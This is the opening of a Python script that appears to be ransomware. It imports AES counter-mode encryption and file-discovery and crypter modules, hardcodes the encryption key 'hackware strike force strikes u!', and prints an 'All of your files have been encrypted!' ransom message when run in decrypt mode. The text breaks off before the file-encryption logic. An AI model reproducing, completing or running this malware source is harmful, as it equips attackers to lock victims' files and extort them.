#!/usr/bin/python3.6
# -*- coding: utf-8 -*-
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Discovery
import Crypter

HARDCODED_KEY = 'hackware strike force strikes u!'


def get_parser():
    parser = argparse.ArgumentParser(description='Crypter')

    parser.add_argument('-d',
                        '--decrypt',
                        help='Decrypt files [default: no]',
                        action='store_true')
    return parser


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('''
            All of your files have been encrypted!
            Encryption HARDCODED_KEY: '{}'
        '''.format(HARDCODED_KEY))

        key = input('Enter with valid key> ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY
